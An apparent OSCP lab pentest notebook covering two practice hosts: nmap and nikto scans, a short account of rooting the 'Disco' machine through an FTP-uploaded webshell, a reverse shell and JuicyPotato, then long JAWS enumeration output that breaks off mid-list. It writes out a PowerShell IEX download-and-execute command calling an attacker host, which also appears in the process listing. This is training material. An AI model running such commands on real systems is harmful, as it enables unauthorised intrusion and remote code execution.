2020-04-26 16:25 EDT<br />Nmap scan report for 10.11.1.10<br />Host is up (0.065s latency).<br />Not shown: 65534 filtered ports<br />PORT   STATE SERVICE<br />80/tcp open  http<br /><br />Nmap done: 1 IP address (1 host up) scanned in 126.65 seconds<br /></div><div class='page'><h1 class='title level-5'>web</h1><br/></div><div class='page'><h1 class='title level-6'>web nmap</h1><br/>PORT   STATE SERVICE REASON  VERSION<br />80/tcp open  http    syn-ack Microsoft IIS httpd 6.0<br />|_http-server-header: Microsoft-IIS/6.0<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /></div><div class='page'><h1 class='title level-6'>nikto</h1><br/>nikto -host <a href="http://10.11.1.10:80">http://10.11.1.10:80</a><br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.11.1.10<br />+ Target Hostname:    10.11.1.10<br />+ Target Port:        80<br />+ Start Time:         2020-04-26 16:26:00 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Microsoft-IIS/6.0<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST <br />+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST <br />+ Uncommon header &#39;server-error&#39; found, with contents: true<br />+ Cookie CFID created without the httponly flag<br />+ Cookie CFTOKEN created without the httponly flag<br />+ Cookie CFAUTHORIZATION_cfadmin created without the httponly flag<br />+ OSVDB-3399: /CFIDE/administrator/index.cfm: ColdFusion Administrator found. ColdFusion 4.5.1 and earlier may have an overflow by submitting a 40k character password. <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0538.">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0538.</a> <a href="http://www.securityfocus.com/bid/1314.">http://www.securityfocus.com/bid/1314.</a><br />+ Cookie CFAUTHORIZATION_componentutils created without the httponly flag<br />+ /CFIDE/componentutils/cfcexplorer.cfc: ColdFusion Component Browser. Default password may be &#39;admin&#39;.<br />+ Cookie JSESSIONID created without the httponly flag<br />+ /flex2gateway/http: Adobe BlazeDS identified.<br />+ /servlet/AxisServlet: Apache Axis web services reveals information about all installed web services. See <a href="http://ws.apache.org/axis/java/security.html">http://ws.apache.org/axis/java/security.html</a> to secure Axis.<br />+ 7891 requests: 2 error(s) and 15 item(s) reported on remote host<br />+ End Time:           2020-04-26 16:37:29 (GMT-4) (689 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br />squid@CoolHandKali:/Yeet/Machines/OSCP/10$ <br /><br /></div><div class='page'><h1 class='title level-4'>Pictures</h1><br/><a href=""><img src="images/914-1.png" alt="images/914-1.png" /></a><br /><br /><a href=""><img src="images/914-2.png" alt="images/914-2.png" /></a><br /><br /><a href=""><img src="images/914-3.png" alt="images/914-3.png" /></a><br /><br /><a href=""><img src="images/914-4.png" alt="images/914-4.png" /></a><br /><br /><a href=""><img src="images/914-5.png" alt="images/914-5.png" /></a><br /><br /><a href=""><img src="images/914-6.png" alt="images/914-6.png" /></a><br /><br /><a href=""><img src="images/914-7.png" alt="images/914-7.png" /></a><br /><br /><br /><a href=""><img src="images/914-8.png" alt="images/914-8.png" /></a><br /><br /><a href=""><img src="images/914-9.png" alt="images/914-9.png" /></a></div><div class='page'><h1 class='title level-3'>10.11.1.13 Disco rooted</h1><br/>Nmap showed that many ports were open.<br />Chris was able to connect to ftp annonymously and upload files.<br />A all port nmap scan shoed that there was an iis server running on port 4167.<br />Upon further review the webroot of this iis server was also the ftproot.<br />He was able to navigate to a aspx webshell he uploaded and execute code.<br />In the .aspx webshell he was able to run a powershell command uploading Invoke-PowerShellTCP.ps1 into memory giving him a reverse shell as iis apppool\defaultapppool.<br />During enumeration he ran whoami /all, which showed him that iis apppool was had the seimpersonate token, which leaves the machine vulnerale to the juicy potato exploit.<br />When running the juicy potato exploit, he had the elevated process token call run.bat, which contained a powershell one-liner to call another Invoke-PowerShellTCP.ps1 into memory creating another reverse shell on a different port as nt authority\system. <br /><br /><br />0c012af5208bac5826bb9dd4d4caedf8</div><div class='page'><h1 class='title level-4'>enumeration</h1><br/>upload via ftp anonymous<br />x64<br /><br />powershell.exe &quot;IEX(new-object net.webclient).downloadstring(&#39;<a href="http://192.168.119.167:80/3232.ps1')"">http://192.168.119.167:80/3232.ps1&#39;)&quot;</a><br /><br />Microsoft Windows Server 2012 R2 Standard </div><div class='page'><h1 class='title level-5'>nmap</h1><br/>echo -e e[5me[31me[1mttl=127e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a> ; nmap -Pn 10.11.1.13 &amp;&amp; nmap -sC -sV -Pn 10.11.1.13 &amp;&amp; nmap -p- -Pn 10.11.1.13<br />ttl=127<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-26 17:43 EDT<br />Nmap scan report for 10.11.1.13<br />Host is up (0.063s latency).<br />Not shown: 985 closed ports<br />PORT      STATE SERVICE<br />21/tcp    open  ftp<br />135/tcp   open  msrpc<br />139/tcp   open  netbios-ssn<br />445/tcp   open  microsoft-ds<br />1433/tcp  open  ms-sql-s<br />3389/tcp  open  ms-wbt-server<br />5800/tcp  open  vnc-http<br />5900/tcp  open  vnc<br />49152/tcp open  unknown<br />49153/tcp open  unknown<br />49154/tcp open  unknown<br />49155/tcp open  unknown<br />49156/tcp open  unknown<br />49157/tcp open  unknown<br />49158/tcp open  unknown<br /><br />Nmap done: 1 IP address (1 host up) scanned in 3.18 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-26 17:44 EDT<br />Nmap scan report for 10.11.1.13<br />Host is up (0.067s latency).<br />Not shown: 985 closed ports<br />PORT      STATE SERVICE            VERSION<br />21/tcp    open  ftp                Microsoft ftpd<br />| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br />| 04-07-19  10:25PM       &lt;DIR&gt;          aspnet_client<br />| 04-25-20  09:34PM                 1400 cmdasp.aspx<br />| 04-07-19  07:14PM                99710 iis-85.png<br />| 04-07-19  07:14PM                  701 iisstart.htm<br />| 04-25-20  12:25PM                38136 loled.asp<br />| 04-25-20  12:33PM                 2736 loled.aspx<br />| 04-26-20  09:34PM                14286 Powerless.bat<br />|_04-25-20  12:15PM                 2063 tcp_445_smb_nmap.txt<br />| ftp-syst: <br />|_  SYST: Windows_NT<br />135/tcp   open  msrpc              Microsoft Windows RPC<br />139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn<br />445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds<br />1433/tcp  open  ms-sql-s           Microsoft SQL Server 2012 11.00.2100.00; RTM<br />| ms-sql-ntlm-info: <br />|   Target_Name: DISCO<br />|   NetBIOS_Domain_Name: DISCO<br />|   NetBIOS_Computer_Name: DISCO<br />|   DNS_Domain_Name: disco<br />|   DNS_Computer_Name: disco<br />|_  Product_Version: 6.3.9600<br />| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback<br />| Not valid before: 2020-03-03T20:03:22<br />|_Not valid after:  2050-03-03T20:03:22<br />|_ssl-date: 2020-04-26T21:43:29+00:00; -2m25s from scanner time.<br />3389/tcp  open  ssl/ms-wbt-server?<br />| rdp-ntlm-info: <br />|   Target_Name: DISCO<br />|   NetBIOS_Domain_Name: DISCO<br />|   NetBIOS_Computer_Name: DISCO<br />|   DNS_Domain_Name: disco<br />|   DNS_Computer_Name: disco<br />|   Product_Version: 6.3.9600<br />|_  System_Time: 2020-04-26T21:43:18+00:00<br />| ssl-cert: Subject: commonName=disco<br />| Not valid before: 2020-04-24T12:07:49<br />|_Not valid after:  2020-10-24T12:07:49<br />5800/tcp  open  vnc-http           TightVNC (user: disco; VNC TCP port: 5900)<br />|_http-title: TightVNC desktop [disco]<br />5900/tcp  open  vnc                VNC (protocol 3.8)<br />|_ssl-cert: ERROR: Script execution failed (use -d to debug)<br />|_ssl-date: ERROR: Script execution failed (use -d to debug)<br />|_sslv2: ERROR: Script execution failed (use -d to debug)<br />|_tls-alpn: ERROR: Script execution failed (use -d to debug)<br />|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)<br />|_vnc-info: ERROR: Script execution failed (use -d to debug)<br />49152/tcp open  msrpc              Microsoft Windows RPC<br />49153/tcp open  msrpc              Microsoft Windows RPC<br />49154/tcp open  msrpc              Microsoft Windows RPC<br />49155/tcp open  msrpc              Microsoft Windows RPC<br />49156/tcp open  msrpc              Microsoft Windows RPC<br />49157/tcp open  msrpc              Microsoft Windows RPC<br />49158/tcp open  msrpc              Microsoft Windows RPC<br />Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows<br /><br />Host script results:<br />|_clock-skew: mean: -2m24s, deviation: 0s, median: -2m25s<br />| ms-sql-info: <br />|   10.11.1.13:1433: <br />|     Version: <br />|       name: Microsoft SQL Server 2012 RTM<br />|       number: 11.00.2100.00<br />|       Product: Microsoft SQL Server 2012<br />|       Service pack level: RTM<br />|       Post-SP patches applied: false<br />|_    TCP port: 1433<br />|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)<br />| smb-security-mode: <br />|   account_used: guest<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: disabled (dangerous, but default)<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled but not required<br />| smb2-time: <br />|   date: 2020-04-26T21:43:18<br />|_  start_date: 2020-03-03T20:03:20<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 113.22 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-26 17:45 EDT<br />Nmap scan report for 10.11.1.13<br />Host is up (0.064s latency).<br />Not shown: 65517 closed ports<br />PORT      STATE SERVICE<br />21/tcp    open  ftp<br />135/tcp   open  msrpc<br />139/tcp   open  netbios-ssn<br />445/tcp   open  microsoft-ds<br />1433/tcp  open  ms-sql-s<br />3389/tcp  open  ms-wbt-server<br />4167/tcp  open  ddgn<br />5800/tcp  open  vnc-http<br />5900/tcp  open  vnc<br />5985/tcp  open  wsman<br />47001/tcp open  winrm<br />49152/tcp open  unknown<br />49153/tcp open  unknown<br />49154/tcp open  unknown<br />49155/tcp open  unknown<br />49156/tcp open  unknown<br />49157/tcp open  unknown<br />49158/tcp open  unknown<br /><br />Nmap done: 1 IP address (1 host up) scanned in 109.07 seconds<br /></div><div class='page'><h1 class='title level-5'>users</h1><br/> Users<br />-----------------------------------------------------------<br />----------<br />Username: admin<br />Groups:   Users<br />----------<br />Username: Administrator<br />Groups:   Administrators<br />----------<br />Username: alice<br />Groups:   Users<br />----------<br />Username: backup<br />Groups:   Users<br />----------<br />Username: david<br />Groups:   Users<br />----------<br />Username: gary<br />Groups:   Users<br />----------<br />Username: Guest<br />Groups:   Guests<br />----------<br />Username: homer<br />Groups:   Users<br />----------<br />Username: john<br />Groups:   Users<br />----------<br />Username: lee<br />Groups:   Users<br />----------<br />Username: lisa<br />Groups:   Users<br />----------<br />Username: mark<br />Groups:   Users<br />----------<br />Username: ned<br />Groups:   Users<br />----------<br />Username: nick<br />Groups:   Users<br />----------<br />Username: tood<br />Groups:   Users</div><div class='page'><h1 class='title level-5'>privesc</h1><br/></div><div class='page'><h1 class='title level-6'>PowerUP</h1><br/>nothing</div><div class='page'><h1 class='title level-6'>Jaws</h1><br/>Running J.A.W.S. Enumeration<br />	- Gathering User Information<br />	- Gathering Processes, Services and Scheduled Tasks<br />	- Gathering Installed Software<br />	- Gathering File System Information<br />	- Looking for Simple Priv Esc Methods<br />############################################################<br />##     J.A.W.S. (Just Another Windows Enum Script)        ##<br />##                                                        ##<br />##           https://github.com/411Hall/JAWS              ##<br />##                                                        ##<br />############################################################<br /><br />Windows Version: Microsoft Windows Server 2012 R2 Standard<br />Architecture: AMD64<br />Hostname: DISCO<br />Current User: DISCO$<br />Current Time\Date: 04/27/2020 13:19:58<br /><br />-----------------------------------------------------------<br /> Users<br />-----------------------------------------------------------<br />----------<br />Username: admin<br />Groups:   Users<br />----------<br />Username: Administrator<br />Groups:   Administrators<br />----------<br />Username: alice<br />Groups:   Users<br />----------<br />Username: backup<br />Groups:   Users<br />----------<br />Username: david<br />Groups:   Users<br />----------<br />Username: gary<br />Groups:   Users<br />----------<br />Username: Guest<br />Groups:   Guests<br />----------<br />Username: homer<br />Groups:   Users<br />----------<br />Username: john<br />Groups:   Users<br />----------<br />Username: lee<br />Groups:   Users<br />----------<br />Username: lisa<br />Groups:   Users<br />----------<br />Username: mark<br />Groups:   Users<br />----------<br />Username: ned<br />Groups:   Users<br />----------<br />Username: nick<br />Groups:   Users<br />----------<br />Username: tood<br />Groups:   Users<br /><br />-----------------------------------------------------------<br /> Network Information<br />-----------------------------------------------------------<br /><br />Windows IP Configuration<br /><br /><br />Ethernet adapter Ethernet0:<br /><br />   Connection-specific DNS Suffix  . : <br />   IPv4 Address. . . . . . . . . . . : 10.11.1.13<br />   Subnet Mask . . . . . . . . . . . : 255.255.0.0<br />   Default Gateway . . . . . . . . . : 10.11.0.1<br /><br />Tunnel adapter isatap.{D162924A-0442-4EF9-8BB7-170757574023}:<br /><br />   Media State . . . . . . . . . . . : Media disconnected<br />   Connection-specific DNS Suffix  . : <br /><br />-----------------------------------------------------------<br /> Arp<br />-----------------------------------------------------------<br /><br />Interface: 10.11.1.13 --- 0xd<br />  Internet Address      Physical Address      Type<br />  10.11.0.1             00-50-56-9f-aa-3e     dynamic   <br />  10.11.1.101           00-50-56-9f-6f-c9     dynamic   <br />  10.11.1.111           00-50-56-9f-73-22     dynamic   <br />  10.11.1.222           00-50-56-9f-2e-79     dynamic   <br />  10.11.255.255         ff-ff-ff-ff-ff-ff     static    <br />  224.0.0.22            01-00-5e-00-00-16     static    <br />  224.0.0.252           01-00-5e-00-00-fc     static    <br /><br /><br />-----------------------------------------------------------<br /> NetStat<br />-----------------------------------------------------------<br /><br />Active Connections<br /><br />  Proto  Local Address          Foreign Address        State           PID<br />  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       588<br />  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       544<br />  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4<br />  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       496<br />  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       2012<br />  TCP    0.0.0.0:4167           0.0.0.0:0              LISTENING       4<br />  TCP    0.0.0.0:5800           0.0.0.0:0              LISTENING       1196<br />  TCP    0.0.0.0:5900           0.0.0.0:0              LISTENING       1196<br />  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4<br />  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4<br />  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       384<br />  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       656<br />  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       696<br />  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       352<br />  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       452<br />  TCP    0.0.0.0:49157          0.0.0.0:0              LISTENING       2040<br />  TCP    0.0.0.0:49158          0.0.0.0:0              LISTENING       460<br />  TCP    10.11.1.13:139         0.0.0.0:0              LISTENING       4<br />  TCP    10.11.1.13:4167        192.168.119.167:38876  CLOSE_WAIT      4<br />  TCP    10.11.1.13:4167        192.168.119.167:38908  ESTABLISHED     4<br />  TCP    10.11.1.13:4167        192.168.119.167:39110  ESTABLISHED     4<br />  TCP    10.11.1.13:49168       192.168.119.167:3232   CLOSE_WAIT      1124<br />  TCP    10.11.1.13:49173       192.168.119.167:3232   ESTABLISHED     2656<br />  TCP    [::]:21                [::]:0                 LISTENING       588<br />  TCP    [::]:135               [::]:0                 LISTENING       544<br />  TCP    [::]:445               [::]:0                 LISTENING       4<br />  TCP    [::]:1433              [::]:0                 LISTENING       496<br />  TCP    [::]:3389              [::]:0                 LISTENING       2012<br />  TCP    [::]:4167              [::]:0                 LISTENING       4<br />  TCP    [::]:5985              [::]:0                 LISTENING       4<br />  TCP    [::]:47001             [::]:0                 LISTENING       4<br />  TCP    [::]:49152             [::]:0                 LISTENING       384<br />  TCP    [::]:49153             [::]:0                 LISTENING       656<br />  TCP    [::]:49154             [::]:0                 LISTENING       696<br />  TCP    [::]:49155             [::]:0                 LISTENING       352<br />  TCP    [::]:49156             [::]:0                 LISTENING       452<br />  TCP    [::]:49157             [::]:0                 LISTENING       2040<br />  TCP    [::]:49158             [::]:0                 LISTENING       460<br />  UDP    0.0.0.0:123            *:*                                    748<br />  UDP    0.0.0.0:500            *:*                                    696<br />  UDP    0.0.0.0:3389           *:*                                    2012<br />  UDP    0.0.0.0:4500           *:*                                    696<br />  UDP    0.0.0.0:5355           *:*                                    816<br />  UDP    10.11.1.13:137         *:*                                    4<br />  UDP    10.11.1.13:138         *:*                                    4<br />  UDP    [::]:123               *:*                                    748<br />  UDP    [::]:500               *:*                                    696<br />  UDP    [::]:3389              *:*                                    2012<br />  UDP    [::]:4500              *:*                                    696<br /><br /><br />-----------------------------------------------------------<br /> Firewall Status<br />-----------------------------------------------------------<br /><br />Firewall is Disabled<br /><br />-----------------------------------------------------------<br /> FireWall Rules<br />-----------------------------------------------------------<br /><br />Name                       LocalPorts                 ApplicationName          <br />----                       ----------                 ---------------          <br />Core Networking - Packe...                                                     <br />TightVNC                                              C:\Program Files\Tight...<br />Remote Desktop - Shadow... *                          C:\Windows\system32\Rd...<br />Core Networking - Dynam... 68                         C:\Windows\system32\sv...<br />Core Networking - Dynam... 546                        C:\Windows\system32\sv...<br />Core Networking - Tered... Teredo                     C:\Windows\system32\sv...<br />FTP Server (FTP Traffic... 21                         C:\Windows\system32\sv...<br />FTP Server Passive (FTP... 1024-65535                 C:\Windows\system32\sv...<br />FTP Server Secure (FTP ... 990                        C:\Windows\system32\sv...<br />Network Discovery (LLMN... 5355                       C:\Windows\system32\sv...<br />Network Discovery (Pub-... 3702                       C:\Windows\system32\sv...<br />Network Discovery (SSDP... 1900                       C:\Windows\system32\sv...<br />Network Discovery (WSD-In) 3702                       C:\Windows\system32\sv...<br />Remote Desktop - User M... 3389                       C:\Windows\system32\sv...<br />Remote Desktop - User M... 3389                       C:\Windows\system32\sv...<br />Core Networking - Desti...                            System                   <br />Core Networking - Desti...                            System                   <br />Core Networking - Inter...                            System                   <br />Core Networking - IPHTT... IPHTTPS                    System                   <br />Core Networking - IPv6 ...                            System                   <br />Core Networking - Multi...                            System                   <br />Core Networking - Multi...                            System                   <br />Core Networking - Multi...                            System                   <br />Core Networking - Multi...                            System                   <br />Core Networking - Neigh...                            System                   <br />Core Networking - Neigh...                            System                   <br />Core Networking - Param...                            System                   <br />Core Networking - Route...                            System                   <br />Core Networking - Route...                            System                   <br />Core Networking - Time ...                            System                   <br />Network Discovery (NB-D... 138                        System                   <br />Network Discovery (NB-N... 137                        System                   <br />Network Discovery (UPnP... 2869                       System                   <br />Network Discovery (WSD ... 5357                       System                   <br />Network Discovery (WSD ... 5358                       System                   <br />Windows Remote Manageme... 5985                       System                   <br />Windows Remote Manageme... 5985                       System                   <br />World Wide Web Services... 80                         System                   <br />World Wide Web Services... 443                        System                   <br />Core Networking - Multi...                                                     <br />Core Networking - Multi...                                                     <br />Core Networking - Multi...                                                     <br />Core Networking - Multi...                                                     <br />Core Networking - Neigh...                                                     <br />Core Networking - Neigh...                                                     <br />Core Networking - Packe...                                                     <br />Core Networking - Param...                                                     <br />Core Networking - Route...                                                     <br />Core Networking - Route...                                                     <br />Core Networking - Time ...                                                     <br />Core Networking - Group... *                          C:\Windows\system32\ls...<br />Core Networking - DNS (... *                          C:\Windows\system32\sv...<br />Core Networking - Dynam... 68                         C:\Windows\system32\sv...<br />Core Networking - Dynam... 546                        C:\Windows\system32\sv...<br />Core Networking - Group... *                          C:\Windows\system32\sv...<br />Core Networking - IPHTT... *                          C:\Windows\system32\sv...<br />Core Networking - Tered... *                          C:\Windows\system32\sv...<br />FTP Server (FTP Traffic... 20                         C:\Windows\system32\sv...<br />FTP Server Secure (FTP ... 989                        C:\Windows\system32\sv...<br />Network Discovery (LLMN... *                          C:\Windows\system32\sv...<br />Network Discovery (Pub ... *                          C:\Windows\system32\sv...<br />Network Discovery (SSDP... *                          C:\Windows\system32\sv...<br />Network Discovery (UPnP... *                          C:\Windows\system32\sv...<br />Network Discovery (WSD-... *                          C:\Windows\system32\sv...<br />Core Networking - Group... *                          System                   <br />Core Networking - Inter...                            System                   <br />Core Networking - IPv6 ...                            System                   <br />Network Discovery (NB-D... *                          System                   <br />Network Discovery (NB-N... *                          System                   <br />Network Discovery (UPnP... *                          System                   <br />Network Discovery (WSD ... *                          System                   <br />Network Discovery (WSD ... *                          System                   <br /><br /><br />-----------------------------------------------------------<br /> Hosts File Content<br />-----------------------------------------------------------<br /><br /># Copyright (c) 1993-2009 Microsoft Corp.<br />#<br /># This is a sample HOSTS file used by Microsoft TCP/IP for Windows.<br />#<br /># This file contains the mappings of IP addresses to host names. Each<br /># entry should be kept on an individual line. The IP address should<br /># be placed in the first column followed by the corresponding host name.<br /># The IP address and the host name should be separated by at least one<br /># space.<br />#<br /># Additionally, comments (such as these) may be inserted on individual<br /># lines or following the machine name denoted by a &#39;#&#39; symbol.<br />#<br /># For example:<br />#<br />#      102.54.94.97     rhino.acme.com          # source server<br />#       38.25.63.10     x.acme.com              # x client host<br /><br /># localhost name resolution is handled within DNS itself.<br />#	127.0.0.1       localhost<br />#	::1             localhost<br /><br /><br />-----------------------------------------------------------<br /> Processes<br />-----------------------------------------------------------<br /><br />Name                ProcessID Owner          CommandLine                       <br />----                --------- -----          -----------                       <br />cmd.exe                  1916 DefaultAppPool &quot;cmd.exe&quot; /c powershell.exe       <br />                                             &quot;IEX(new-object net.webclient).dow<br />                                             nloadstring(&#39;http://192.168.119.16<br />                                             7:80/je.ps1&#39;)&quot;                    <br />cmd.exe                  1492 DefaultAppPool &quot;cmd.exe&quot; /c powershell.exe       <br />                                             &quot;IEX(new-object net.webclient).dow<br />                                             nloadstring(&#39;http://192.168.119.16<br />                                             7:80/3232.ps1&#39;)&quot;                  <br />cmd.exe                  1476 DefaultAppPool &quot;cmd.exe&quot; /c powershell.exe       <br />                                             &quot;IEX(new-object net.webclient).dow<br />                                             nloadstring(&#39;http://192.168.119.16<br />                                             7:80/3232.ps1&#39;)&quot;                  <br />conhost.exe              1688 DefaultAppPool \??\C:\Windows\system32\conhost.ex<br />                                             e 0x4                             <br />conhost.exe              1640 DefaultAppPool \??\C:\Windows\system32\conhost.ex<br />                                             e 0x4                             <br />conhost.exe              2576 DefaultAppPool \??\C:\Windows\system32\conhost.ex<br />                                             e 0x4                             <br />csrss.exe                 304                                                  <br />csrss.exe                 356                                                  <br />dllhost.exe              2068                                                  <br />dwm.exe                   644                                                  <br />LogonUI.exe              2428                                                  <br />lsass.exe                 460                                                  <br />msdtc.exe                2208                                                  <br />net.exe                  2368 DefaultAppPool &quot;C:\Windows\system32\net.exe&quot;     <br />                                             use \\1nsider                     <br />powershell.exe           2656 DefaultAppPool powershell.exe  &quot;IEX(new-object ne<br />                                             t.webclient).downloadstring(&#39;http:<br />                                             //192.168.119.167:80/3232.ps1&#39;)&quot;  <br />powershell.exe           1852 DefaultAppPool powershell.exe  &quot;IEX(new-object ne<br />                                             t.webclient).downloadstring(&#39;http:<br />                                             //192.168.119.167:80/je.ps1&#39;)&quot;    <br />powershell.exe           1124 DefaultAppPool powershell.exe  &quot;IEX(new-object ne<br />                                             t.webclient).downloadstring(&#39;http:<br />                                             //192.168.119.167:80/3232.ps1&#39;)&quot;  <br />services.exe              452                                                  <br />smss.exe                  212                                                  <br />spoolsv.exe               352                                                  <br />sqlservr.exe              496                                                  <br />sqlwriter.exe            1156                                                  <br />svchost.exe               928                                                  <br />svchost.exe               816                                                  <br />svchost.exe               528                                                  <br />svchost.exe               280                                                  <br />svchost.exe               748                                                  <br />svchost.exe               544                                                  <br />svchost.exe               516                                                  <br />svchost.exe               696                                                  <br />svchost.exe               656                                                  <br />svchost.exe               588                                                  <br />svchost.exe              1172                                                  <br />svchost.exe              1380                                                  <br />svchost.exe              2040                                                  <br />svchost.exe              2012                                                  <br />System                      4                                                  <br />System Idle Process         0                                                  <br />tvnserver.exe            1196                                                  <br />VGAuthService.exe        1268                                                  <br />vmtoolsd.exe             1364                                                  <br />w3wp.exe                 1716 DefaultAppPool c:\windows\system32\inetsrv\w3wp.e<br />                                             xe -ap &quot;DefaultAppPool&quot; -v &quot;v4.0&quot; <br />                                             -l &quot;webengine4.dll&quot; -a \\.\pipe\ii<br />                                             sipm5659c1ec-b10a-44d6-ba7a-c73867<br />                                             aa9805 -h &quot;C:\inetpub\temp\apppool<br />                                             s\DefaultAppPool\DefaultAppPool.co<br />                                             nfig&quot; -w &quot;&quot; -m 0 -t 20 -ta 0      <br />wininit.exe               384                                                  <br />winlogon.exe              392                                                  <br />WmiApSrv.exe             1628                                                  <br />WmiPrvSE.exe             1808                                                  <br /><br /><br /><br />-----------------------------------------------------------<br /> Scheduled Tasks<br />-----------------------------------------------------------<br />Current System Time: 04/27/2020 13:20:02<br /><br />TaskName    : \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 <br />              64<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 <br />              64 Critical<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 <br />              Critical<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\Active Directory Rights Management Services <br />              Client\AD RMS Rights Policy Template Management (Automated)<br />Run As User : Everyone<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\Active Directory Rights Management Services <br />              Client\AD RMS Rights Policy Template Management (Automated)<br />Run As User : Everyone<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\Active Directory Rights Management Services <br />              Client\AD RMS Rights Policy Template Management (Manual)<br />Run As User : Everyone<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\AppID\SmartScreenSpecific<br />Run As User : INTERACTIVE<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\Application Experience\ProgramDataUpdater<br />Run As User : SYSTEM<br />Task To Run : %windir%\system32\rundll32.exe <br />              %windir%\system32\invagent.dll,RunUpdate<br /><br />TaskName    : \Microsoft\Windows\Autochk\Proxy<br />Run As User : SYSTEM<br />Task To Run : %windir%\system32\rundll32.exe /d <br />              acproxy.dll,PerformAutochkOperations<br /><br />TaskName    : \Microsoft\Windows\Chkdsk\ProactiveScan<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\Customer Experience Improvement <br />              Program\Consolidator<br />Run As User : SYSTEM<br />Task To Run : %SystemRoot%\System32\wsqmcons.exe <br /><br />TaskName    : \Microsoft\Windows\Customer Experience Improvement <br />              Program\KernelCeipTask<br />Run As User : LOCAL SERVICE<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\Customer Experience Improvement <br />              Program\UsbCeip<br />Run As User : Administrators<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\Customer Experience Improvement <br />              Program\Server\ServerCeipAssistant<br />Run As User : SYSTEM<br />Task To Run : %windir%\system32\ceipdata.exe -id 1<br /><br />TaskName    : \Microsoft\Windows\Data Integrity Scan\Data Integrity Scan<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\Data Integrity Scan\Data Integrity Scan<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\Data Integrity Scan\Data Integrity Scan for <br />              Crash Recovery<br />Run As User : SYSTEM<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\Defrag\ScheduledDefrag<br />Run As User : SYSTEM<br />Task To Run : %windir%\system32\defrag.exe -c -h -k -g -$<br /><br />TaskName    : \Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents<br />Run As User : Administrators<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents<br />Run As User : Administrators<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents<br />Run As User : Administrators<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents<br />Run As User : Administrators<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\MemoryDiagnostic\RunFullMemoryDiagnostic<br />Run As User : Administrators<br />Task To Run : COM handler<br /><br />TaskName    : \Microsoft\Windows\MUI\LPRemove<br />Run As User : SYSTEM<br />Task To Run : %windir%\system32\lpremove.exe <br /><br />TaskName    : 